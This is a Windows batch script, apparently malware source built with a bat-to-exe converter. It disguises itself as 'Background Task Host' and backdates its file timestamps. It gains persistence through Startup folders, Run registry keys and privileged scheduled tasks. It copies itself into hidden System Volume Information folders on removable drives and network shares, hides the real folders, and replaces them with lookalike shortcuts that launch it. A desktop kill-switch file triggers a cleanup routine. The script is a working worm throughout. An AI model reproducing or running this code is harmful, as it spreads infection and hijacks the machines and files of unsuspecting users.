::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheFUEAlXVbTjuSOR8
::ZQ05rAF9IBncCkqN+0xwdVsFHErScjrtV+ZIprmb
::ZQ05rAF9IAHYFVzEqQIdIRhGQxeNOn8YyPUr4eb/4P2UAINde/I6ao7P07qJYNMK+VHhePY=
::eg0/rx1wNQPfEVWB+kM9LVsJDAaDP2C9FLoJ5uzP7vmMikIOQKw6YIq7
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQISKRhfSxaNKWW+RoEd++O7x+WUti0=
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEVosdIRhGQxeNOn/6JboO+Ofp7v6OrUNTFMMzdM/J07OGNPNT+ED3cIQ70346
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJAnXugIGJBpQDC2UPWW1EIlMvqa7wP6Pp18hZPAwcorYzqeyG8ca/m3xd9Yf02pVi8IYAwlRewGWUg01qmVFpGuQOcOoshzqYkea8gU1A2BIhWLThywpb8ZmnvcCwCuW817r0aAI1Bg=
::YB416Ek+Zm8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
chcp 65001>nul

%~d0
cd "%~dp0"

setlocal EnableDelayedExpansion





set parameters=%*
set counter=0
for %%i in (%parameters%) do (
  set /a counter+=1
  if !counter! GEQ 2 set parameters2=!parameters2!%%i
)
set key_target=%parameters2:*--key_target=%

if "!key_target!" NEQ "*--key_target=" start "" explorer !key_target!



for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i" == "%~nx0" for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq cmd.exe"') do if "%%i" == "cmd.exe" exit





set app_name=Background Task Host
set app_date=09-11-2001

set module_fileTouch=modules\fileTouch.exe
set module_shortcut=modules\shortcut.exe
set module_wget=modules\wget.exe

set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
set path_startMenu2=%appData%\Microsoft\Windows\Start Menu\Programs
set path_autoRun1=%path_startMenu1%\Startup
set path_autoRun2=%path_startMenu2%\Startup

set path_desktop=%userProfile%\Desktop
if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop') do call set path_desktop=%%j)>nul 2>nul



%module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"















:cycle
if exist "%path_desktop%\09.11.2001" goto :remover

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul





if exist "%path_autoRun1%\%~nx0" (
  copy /y "%~dpnx0" "%path_autoRun1%\"
  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
)

if not exist "%path_autoRun2%\%~nx0" (
  copy /y "%~dpnx0" "%path_autoRun2%\"
  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
)





for %%i in (localAppData appData) do (
  if exist "!%%i!\%~nx0" (
    (
      call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
      call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
      call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
      call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /
      call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
      call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
    )>nul 2>nul
  ) else call copy /y "%~dpnx0" "!%%i!\"
)





for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" == "System Volume Information" if not exist "%%i:\%%j\%~nx0" (
      attrib +h +s "%%i:\%%j"
      copy /y "%~dpnx0" "%%i:\%%j\"
    ) else (
      (
        %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
        reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
        reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
        reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
        schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
      )>nul 2>nul
    )

    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib +h +s "%%i:\%%j"
      if not exist "%%i:\%%j.lnk" (
        set counter=0
        for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
        if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
        ) else set icon=%WinDir%\System32\imageres.dll,153
        if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
        %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
      )
    )
  )
) else (
  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib -h -s "%%i:\%%j"
      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
    )
  )
)

timeout /nobreak /t 5 >nul





for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
      if /i "%%j" == "System Volume Information" if not exist "%%h\%%i\%%j\%~nx0" (
        attrib +h +s "%%h\%%i\%%j"
        copy /y "%~dpnx0" "%%h\%%i\%%j\"
      ) else (
        (
          %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
          reg add %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
          reg add %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
          reg add %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
          reg add %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
          for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
        )>nul 2>nul
      )
  
      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
        attrib +h +s "%%h\%%i\%%j"
        if not exist "%%h\%%i\%%j.lnk" (
          set counter=0
          for /f "delims=" %%y in ('dir "%%h\%%i\%%j\*" /b 2^>nul') do set /a counter+=1
          if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
          ) else set icon=%WinDir%\System32\imageres.dll,153
          if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
          %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
        )
      )
    )
  )
)

timeout /nobreak /t 5 >nul
goto :cycle















:remover
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul

if exist "%path_autoRun1%\%~nx0" del /q "%path_autoRun1%\%~nx0"
if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"





for %%i in (localAppData appData) do (
  (
    call del /q "!%%i!\%~nx0"
    call reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
    call reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
    call reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
    call reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
    call schtasks /delete /tn "%app_name% %%i" /f
  )>nul 2>nul
)





for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
    if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
      (
        del /q "%%i:\%%j\%~nx0"
        reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
        reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
        reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
        reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
        schtasks /delete /tn "%app_name% %%i" /f
      )>nul 2>nul
    )

    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
      attrib -h -s "%%i:\%%j"
      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
    )
  )
)





for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
      if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
        (
          del /q "%%h\%%i\%%j\%~nx0"
          reg delete %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
          reg delete %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
          reg delete %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
          reg delete %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
          for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%i" /f
        )>nul 2>nul
      )

      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
        attrib -h -s "%%h\%%i\%%j"
        if exist "%%h\%%i\%%j.lnk" del /q "%%h\%%i\%%j.lnk"
      )
    )
  )
)





attrib -h -r -s "%~dpnx0"
start /min "" cmd /c "timeout /t 5 && del /q """%~dpnx0""" && pause"
exit